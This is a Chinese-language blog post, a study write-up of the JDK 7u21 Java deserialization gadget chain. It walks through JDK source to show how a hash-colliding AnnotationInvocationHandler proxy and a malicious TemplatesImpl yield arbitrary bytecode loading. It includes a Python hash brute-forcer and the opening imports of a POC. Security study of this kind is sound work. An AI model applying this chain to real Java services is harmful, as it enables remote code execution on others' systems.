<!DOCTYPE html>
<html lang="en"><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <style>
        :root {
            --accent-color: #FF4D4D;
        }
    </style>

    
    
    
    
    
    

    
    <title>jdk7u21反序列化链学习</title>
    <meta name="description" content="Fortunate enough to get a glimpse of the feast of techiques.">
    <meta name="keywords" content='Web'>

    <meta property="og:url" content="https://kingbridgess.github.io/posts/jdk7u21/">
    <meta property="og:type" content="website">
    <meta property="og:title" content="jdk7u21反序列化链学习">
    <meta property="og:description" content="Fortunate enough to get a glimpse of the feast of techiques.">
    <meta property="og:image" content="/images/avatar.jpg">

    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="jdk7u21反序列化链学习">
    <meta name="twitter:description" content="Fortunate enough to get a glimpse of the feast of techiques.">
    <meta property="twitter:domain" content="https://kingbridgess.github.io/posts/jdk7u21/">
    <meta property="twitter:url" content="https://kingbridgess.github.io/posts/jdk7u21/">
    <meta name="twitter:image" content="/images/avatar.jpg">

    
    <link rel="canonical" href="https://kingbridgess.github.io/posts/jdk7u21/" />

    <link rel="stylesheet" type="text/css" href="https://kingbridgess.github.io/css/normalize.min.css" media="print" onload="this.media='all'">
    <link rel="stylesheet" type="text/css" href="https://kingbridgess.github.io/css/main.css">
    <link disabled id="dark-theme" rel="stylesheet" href="https://kingbridgess.github.io/css/dark.css">

    <script src="https://kingbridgess.github.io/js/svg-injector.min.js"></script>
    <script src="https://kingbridgess.github.io/js/feather-icons.min.js"></script>
    <script src="https://kingbridgess.github.io/js/main.js"></script>

    
    
</head>
<body>
        <script type="text/javascript">
            
            setThemeByUserPref();
        </script><header class="header">
    <nav class="header-nav">

        
        <div class="avatar">
            <a href="https://kingbridgess.github.io">
                <img src="https://kingbridgess.github.io/images/avatar.jpg" alt="avatar" />
            </a>
        </div>
        

        <div class="nav-title">
            <a class="nav-brand" href="https://kingbridgess.github.io">BRIdGE</a>
        </div>

        <div class="nav-links">
            
            <div class="nav-link">
                <a href="https://kingbridgess.github.io/posts/"> Posts </a>
            </div>
            
            <div class="nav-link">
                <a href="https://kingbridgess.github.io/tags/"> Tags </a>
            </div>
            
            <div class="nav-link">
                <a href="https://kingbridgess.github.io/about"> About </a>
            </div>
            
            <div class="nav-link">
                <a href="https://kingbridgess.github.io/contact/"> Contact </a>
            </div>
            
            <div class="nav-link">
                <a href="https://github.com/kingbridgess"><span data-feather='github'></span>  </a>
            </div>
            

            <span class="nav-icons-divider"></span>
            <div class="nav-link dark-theme-toggle">
                <span id="dark-theme-toggle-screen-reader-target" class="sr-only"></span>
                <a>
                    <span id="theme-toggle-icon" data-feather="moon"></span>
                </a>
            </div>

            <div class="nav-link" id="hamburger-menu-toggle">
                <span id="hamburger-menu-toggle-screen-reader-target" class="sr-only">menu</span>
                <a>
                    <span data-feather="menu"></span>
                </a>
            </div>

            
            <ul class="nav-hamburger-list visibility-hidden">
                
                <li class="nav-item">
                    <a href="https://kingbridgess.github.io/posts/"> Posts </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://kingbridgess.github.io/tags/"> Tags </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://kingbridgess.github.io/about"> About </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://kingbridgess.github.io/contact/"> Contact </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://github.com/kingbridgess"><span data-feather='github'></span>  </a>
                </li>
                
                <li class="nav-item dark-theme-toggle">
                    <span id="dark-theme-toggle-screen-reader-target" class="sr-only">theme</span>
                    <a>
                        <span id="theme-toggle-icon" data-feather="moon"></span>
                    </a>
                </li>
            </ul>

        </div>
    </nav>
</header>
<main id="content">
    <div class="post container">
    <div class="post-header-section">
        <h1>jdk7u21反序列化链学习</h1>
        <small role="doc-subtitle"></small>
        <p class="post-date">
            October 31, 2022
        </p>

        <ul class="post-tags">
        
            <li class="post-tag"><a href="https://kingbridgess.github.io/tags/web">Web</a></li>
        
        </ul>
    </div>

    <div class="post-content">
        <p>
            <p>jdk7u21、jdk7u80两条原生反序列化链确实太酷了，确实学到了很多东西。</p>
<h2 id="分析">分析</h2>
<p>当用AnnotationInvocationHandler代理的对象调用equals方法时会调用如下方法</p>
<p>sun.reflect.annotation.AnnotationInvocationHandler#equalsImpl</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">private</span> Boolean <span style="color:#50fa7b">equalsImpl</span><span style="color:#ff79c6">(</span>Object var1<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>var1 <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">this</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">true</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(!</span><span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">type</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">isInstance</span><span style="color:#ff79c6">(</span>var1<span style="color:#ff79c6">))</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">false</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        Method<span style="color:#ff79c6">[]</span> var2 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">getMemberMethods</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">int</span> var3 <span style="color:#ff79c6">=</span> var2<span style="color:#ff79c6">.</span><span style="color:#50fa7b">length</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">for</span><span style="color:#ff79c6">(</span><span style="color:#8be9fd">int</span> var4 <span style="color:#ff79c6">=</span> 0<span style="color:#ff79c6">;</span> var4 <span style="color:#ff79c6">&lt;</span> var3<span style="color:#ff79c6">;</span> <span style="color:#ff79c6">++</span>var4<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            Method var5 <span style="color:#ff79c6">=</span> var2<span style="color:#ff79c6">[</span>var4<span style="color:#ff79c6">];</span>
</span></span><span style="display:flex;"><span>            String var6 <span style="color:#ff79c6">=</span> var5<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getName</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>            Object var7 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">memberValues</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">get</span><span style="color:#ff79c6">(</span>var6<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            Object var8 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>            AnnotationInvocationHandler var9 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">asOneOfUs</span><span style="color:#ff79c6">(</span>var1<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>var9 <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                var8 <span style="color:#ff79c6">=</span> var9<span style="color:#ff79c6">.</span><span style="color:#50fa7b">memberValues</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">get</span><span style="color:#ff79c6">(</span>var6<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                    var8 <span style="color:#ff79c6">=</span> var5<span style="color:#ff79c6">.</span><span style="color:#50fa7b">invoke</span><span style="color:#ff79c6">(</span>var1<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>InvocationTargetException var11<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">false</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>IllegalAccessException var12<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">throw</span> <span style="color:#ff79c6">new</span> AssertionError<span style="color:#ff79c6">(</span>var12<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(!</span>memberValueEquals<span style="color:#ff79c6">(</span>var7<span style="color:#ff79c6">,</span> var8<span style="color:#ff79c6">))</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">false</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">true</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>关键在<code>var5.invoke(var1)</code>这一行，是可以调用任意对象任意方法的。其中var5是可控的AnnotationInvocationHandler的属性。仿照CC3链，如果把var1设置为包含字节码的templates，var5设置为getOutputProperties方法，就可以加载任意字节码。</p>
<p>而众所周知hashMap(或者hashTable)在put的时候会有对key.equal的操作（在CC7链中也有相应的利用）</p>
<p>虽然我数据结构作业DDL没有做，但是我至少得知道HashMap是什么</p>
<blockquote>
<p>散列表（Hash table，也叫哈希表），是根据关键码值(Key value)而直接进行访问的数据结构。也就是说，它通过把关键码值映射到表中一个位置来访问记录，以加快查找的速度。这个映射函数叫做散列函数，存放记录的数组叫做散列表。
给定表M，存在函数f(key)，对任意给定的关键字值key，代入函数后若能得到包含该关键字的记录在表中的地址，则称表M为哈希(Hash）表，函数f(key)为哈希(Hash) 函数。</p>
<p>java中使用的实现为拉链法，即：在每个冲突处构建链表，将所有冲突值链入链表，如同拉链一般一个元素扣一个元素，故名拉链法。</p>
</blockquote>
<p>HashMap#readObject有这样一段代码，在反序列化流中循环读取K,V并依次put到map中：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">for</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">int</span> i<span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">;</span> i<span style="color:#ff79c6">&lt;</span>mappings<span style="color:#ff79c6">;</span> i<span style="color:#ff79c6">++)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    K key <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>K<span style="color:#ff79c6">)</span> s<span style="color:#ff79c6">.</span><span style="color:#50fa7b">readObject</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>    V value <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>V<span style="color:#ff79c6">)</span> s<span style="color:#ff79c6">.</span><span style="color:#50fa7b">readObject</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>    putForCreate<span style="color:#ff79c6">(</span>key<span style="color:#ff79c6">,</span> value<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>HashMap#putForCreate</p>
<p>接下来计算key的hash值，如果出现了hash冲突，且key完全一样，则把值更新</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">putForCreate</span><span style="color:#ff79c6">(</span>K key<span style="color:#ff79c6">,</span> V value<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> hash <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">null</span> <span style="color:#ff79c6">==</span> key <span style="color:#ff79c6">?</span> 0 <span style="color:#ff79c6">:</span> hash<span style="color:#ff79c6">(</span>key<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> indexFor<span style="color:#ff79c6">(</span>hash<span style="color:#ff79c6">,</span> table<span style="color:#ff79c6">.</span><span style="color:#50fa7b">length</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">/**
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         * Look for preexisting entry for key.  This will never happen for
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         * clone or deserialize.  It will only happen for construction if the
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         * input Map is a sorted map whose ordering is inconsistent w/ equals.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> <span style="color:#ff79c6">(</span>Entry<span style="color:#ff79c6">&lt;</span>K<span style="color:#ff79c6">,</span>V<span style="color:#ff79c6">&gt;</span> e <span style="color:#ff79c6">=</span> table<span style="color:#ff79c6">[</span>i<span style="color:#ff79c6">];</span> e <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">;</span> e <span style="color:#ff79c6">=</span> e<span style="color:#ff79c6">.</span><span style="color:#50fa7b">next</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        Object k<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>e<span style="color:#ff79c6">.</span><span style="color:#50fa7b">hash</span> <span style="color:#ff79c6">==</span> hash <span style="color:#ff79c6">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">((</span>k <span style="color:#ff79c6">=</span> e<span style="color:#ff79c6">.</span><span style="color:#50fa7b">key</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">==</span> key <span style="color:#ff79c6">||</span> <span style="color:#ff79c6">(</span>key <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">null</span> <span style="color:#ff79c6">&amp;&amp;</span> key<span style="color:#ff79c6">.</span><span style="color:#50fa7b">equals</span><span style="color:#ff79c6">(</span>k<span style="color:#ff79c6">))))</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            e<span style="color:#ff79c6">.</span><span style="color:#50fa7b">value</span> <span style="color:#ff79c6">=</span> value<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    createEntry<span style="color:#ff79c6">(</span>hash<span style="color:#ff79c6">,</span> key<span style="color:#ff79c6">,</span> value<span style="color:#ff79c6">,</span> i<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p><code>key.equals(k)</code>中的key和k都是完全可以控制的。但是要走到这一步必须保证put进去的两个key hash值相等。跟进HashMap#hash看看是怎么计算的</p>
<p>会发现只和k.hashCode()的值有关。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">final</span> <span style="color:#8be9fd">int</span> <span style="color:#50fa7b">hash</span><span style="color:#ff79c6">(</span>Object k<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> h <span style="color:#ff79c6">=</span> 0<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>useAltHashing<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>k <span style="color:#ff79c6">instanceof</span> String<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> sun<span style="color:#ff79c6">.</span><span style="color:#50fa7b">misc</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">Hashing</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">stringHash32</span><span style="color:#ff79c6">((</span>String<span style="color:#ff79c6">)</span> k<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>        h <span style="color:#ff79c6">=</span> hashSeed<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    h <span style="color:#ff79c6">^=</span> k<span style="color:#ff79c6">.</span><span style="color:#50fa7b">hashCode</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// This function ensures that hashCodes that differ only by
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#6272a4">// constant multiples at each bit position have a bounded
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#6272a4">// number of collisions (approximately 8 at default load factor).
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    h <span style="color:#ff79c6">^=</span> <span style="color:#ff79c6">(</span>h <span style="color:#ff79c6">&gt;&gt;&gt;</span> 20<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">^</span> <span style="color:#ff79c6">(</span>h <span style="color:#ff79c6">&gt;&gt;&gt;</span> 12<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> h <span style="color:#ff79c6">^</span> <span style="color:#ff79c6">(</span>h <span style="color:#ff79c6">&gt;&gt;&gt;</span> 7<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">^</span> <span style="color:#ff79c6">(</span>h <span style="color:#ff79c6">&gt;&gt;&gt;</span> 4<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>梳理一下，假设被AnnotationInvocationHandler代理的对象为proxy，恶意TemplatesImpl为templates，那这里就需要构造两个key，一个是proxy，一个是templates。</p>
<p>templates的hashCode继承的是Object的native方法，完全不可知</p>
<p>而调用proxy.hashCode会被AnnotationInvocationHandler劫持，实际调用AnnotationInvocationHandler#hashCodeImpl</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd">int</span> <span style="color:#50fa7b">hashCodeImpl</span><span style="color:#ff79c6">()</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> var1 <span style="color:#ff79c6">=</span> 0<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Entry var3<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span><span style="color:#ff79c6">(</span>Iterator var2 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">memberValues</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">entrySet</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">iterator</span><span style="color:#ff79c6">();</span> var2<span style="color:#ff79c6">.</span><span style="color:#50fa7b">hasNext</span><span style="color:#ff79c6">();</span> var1 <span style="color:#ff79c6">+=</span> 127 <span style="color:#ff79c6">*</span> <span style="color:#ff79c6">((</span>String<span style="color:#ff79c6">)</span>var3<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getKey</span><span style="color:#ff79c6">()).</span><span style="color:#50fa7b">hashCode</span><span style="color:#ff79c6">()</span> <span style="color:#ff79c6">^</span> memberValueHashCode<span style="color:#ff79c6">(</span>var3<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getValue</span><span style="color:#ff79c6">()))</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        var3 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>Entry<span style="color:#ff79c6">)</span>var2<span style="color:#ff79c6">.</span><span style="color:#50fa7b">next</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> var1<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>分析知道，var1（也就是返回的hash值）是通过AnnotationInvocationHandler.memberValues的所有k,v值计算出来的，而恰恰memberValues又是可控的。于是可以精心构造一个memberValues，使得计算出来的hash值和templates相等。</p>
<p>假设memberValues只有一个entry(k,v)，而k.hashCode()返回0，因为任何数异或0等于它本身，所以实际上计算出的hash就等于v.hashCode()。也就是说，让</p>
<pre tabindex="0"><code>k.hashCode()=0
v=templates
</code></pre><p>就能让<code>proxy.hashCode()=0</code></p>
<p>由于key被写死成了String类，需要爆破一个hash值为0的String。写了一个python脚本</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwnlib.util.iters <span style="color:#ff79c6">import</span> bruteforce
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> string
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>max1<span style="color:#ff79c6">=</span><span style="color:#bd93f9">2</span><span style="color:#ff79c6">**</span><span style="color:#bd93f9">32</span>
</span></span><span style="display:flex;"><span>max2<span style="color:#ff79c6">=</span><span style="color:#bd93f9">2</span><span style="color:#ff79c6">**</span><span style="color:#bd93f9">31</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">int32</span>(x):
</span></span><span style="display:flex;"><span>    x<span style="color:#ff79c6">=</span>x<span style="color:#ff79c6">%</span><span style="color:#bd93f9">2</span><span style="color:#ff79c6">**</span><span style="color:#bd93f9">32</span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># 其实就是补码反求原码</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> x <span style="color:#ff79c6">if</span> x<span style="color:#ff79c6">&lt;=</span>max2<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span> <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">-~</span>(x<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">hashCode</span>(s):
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        public int hashCode() {
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        int h = hash;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        if (h == 0 &amp;&amp; value.length &gt; 0) {
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            char val[] = value;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            for (int i = 0; i &lt; value.length; i++) {
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">                h = 31 * h + val[i];
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            }
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            hash = h;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        }
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        return h;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">    }
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">    &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    h<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>    n<span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">len</span>(s)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(n):
</span></span><span style="display:flex;"><span>        h<span style="color:#ff79c6">=</span>int32(int32(<span style="color:#bd93f9">31</span><span style="color:#ff79c6">*</span>h)<span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">ord</span>(s[i]))
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> h
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(bruteforce(<span style="color:#ff79c6">lambda</span> x: hashCode(x) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>, string<span style="color:#ff79c6">.</span>printable, length<span style="color:#ff79c6">=</span><span style="color:#bd93f9">5</span>))
</span></span></code></pre></div><p>吃了个晚饭都没跑出来= = 看来没个超算确实不配卷安全</p>
<p><img src="https://s2.loli.net/2022/10/31/RdnvSbkH6mLBWra.png" alt="image-20221031195521465"></p>
<p>好在ysoserial已经送了我们一个这样的字符串<code>f5a5a608</code></p>
<p><img src="https://s2.loli.net/2022/10/31/aN1ZqBVnf23CyHi.png" alt="image-20221031212035200"></p>
<h2 id="poc">POC</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">package</span> Explore<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javassist.ClassPool<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.naming.Name<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.xml.transform.Templates<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.lang.reflect.Constructor<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.lang.reflect.InvocationHandler<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.lang.reflect.Method<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.lang.reflect.Proxy<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.HashMap<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.Map<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import static</span> utils.Yso.setFieldValue<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import static</span> utils.SerAndDe.*<span style="color:#ff79c6">;</span>
